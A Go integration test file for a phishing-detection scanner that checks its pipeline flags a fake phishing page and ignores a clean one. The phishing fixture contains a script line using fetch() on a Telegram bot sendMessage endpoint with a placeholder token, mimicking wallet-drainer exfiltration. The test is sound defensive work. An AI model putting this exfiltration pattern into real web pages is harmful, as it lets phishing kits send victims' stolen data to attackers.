package integration

import (
	"context"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"testing"
	"time"

	"github.com/alexiares/alexiares/internal/collector"
	"github.com/alexiares/alexiares/internal/correlation"
	"github.com/alexiares/alexiares/internal/evidence"
	"github.com/alexiares/alexiares/internal/favicon"
	"github.com/alexiares/alexiares/internal/fingerprint"
	"github.com/alexiares/alexiares/internal/intel"
	"github.com/alexiares/alexiares/internal/javascript"
	"github.com/alexiares/alexiares/internal/telegram"
)

// TestFullScanPipelineDetectsBundledSignature exercises the complete
// scan pipeline — collect, extract, fingerprint, correlate, evaluate —
// against a local server standing in for a phishing page that reuses
// the Telegram exfiltration pattern from the repo's own bundled
// example signature (signatures/infrastructure/wallet_drainer_cluster_001.yaml).
//
// This is the same pipeline `alexiares scan` runs; it is exercised
// here as a test rather than only by hand, so a future change that
// breaks detection fails CI instead of only a manual smoke test.
func TestFullScanPipelineDetectsBundledSignature(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`<html><body>
			<script>fetch("https://api.telegram.org/bot123456789:AAExampleTokenValue1234567890123456/sendMessage")</script>
		</body></html>`))
	}))
	defer srv.Close()

	sigs, err := intel.LoadSignatures(filepath.Join(repoRoot(t), "signatures"))
	if err != nil {
		t.Fatalf("LoadSignatures() error = %v", err)
	}

	c := collector.New(collector.Options{Timeout: 5 * time.Second})
	raw, err := c.Collect(context.Background(), srv.URL)
	if err != nil {
		t.Fatalf("Collect() error = %v", err)
	}

	jsArtifacts := javascript.Extract(raw.HTML, raw.ScriptURLs, raw.Scripts)
	favArtifacts := favicon.Compute(raw.Favicon)
	fp := fingerprint.Compute(raw, favArtifacts, jsArtifacts)
	telegramArtifacts := telegram.Extract(raw.HTML)

	corr := correlation.Correlate(correlation.Target{
		Domain:       srv.URL,
		Fingerprints: fp,
		Telegram:     telegramArtifacts,
	}, sigs)

	report := evidence.Evaluate(srv.URL, corr)

	if report.Confidence != "high" {
		t.Fatalf("Confidence = %q, want high; evidence: %+v", report.Confidence, report.Evidence)
	}
	if len(report.Evidence) == 0 {
		t.Fatal("Evidence is empty, want at least the Telegram match")
	}
	found := false
	for _, item := range report.Evidence {
		if item.SignatureID == "wallet_drainer_cluster_001" && item.Category == "telegram" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected a telegram match against wallet_drainer_cluster_001, got: %+v", report.Evidence)
	}
	if report.Recommendation == "" {
		t.Error("Recommendation is empty, want an actionable message")
	}
}

// TestFullScanPipelineCleanTargetNoDetection confirms the pipeline
// doesn't false-positive on an ordinary page with none of the
// bundled signature's indicators.
func TestFullScanPipelineCleanTargetNoDetection(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`<html><head><title>Ordinary page</title></head><body><p>Nothing suspicious here.</p></body></html>`))
	}))
	defer srv.Close()

	sigs, err := intel.LoadSignatures(filepath.Join(repoRoot(t), "signatures"))
	if err != nil {
		t.Fatalf("LoadSignatures() error = %v", err)
	}

	c := collector.New(collector.Options{Timeout: 5 * time.Second})
	raw, err := c.Collect(context.Background(), srv.URL)
	if err != nil {
		t.Fatalf("Collect() error = %v", err)
	}

	jsArtifacts := javascript.Extract(raw.HTML, raw.ScriptURLs, raw.Scripts)
	favArtifacts := favicon.Compute(raw.Favicon)
	fp := fingerprint.Compute(raw, favArtifacts, jsArtifacts)
	telegramArtifacts := telegram.Extract(raw.HTML)

	corr := correlation.Correlate(correlation.Target{
		Domain:       srv.URL,
		Fingerprints: fp,
		Telegram:     telegramArtifacts,
	}, sigs)

	report := evidence.Evaluate(srv.URL, corr)

	if report.Confidence != "" {
		t.Errorf("Confidence = %q, want empty (no detection) for a clean page", report.Confidence)
	}
	if len(report.Evidence) != 0 {
		t.Errorf("Evidence = %+v, want empty for a clean page", report.Evidence)
	}
}
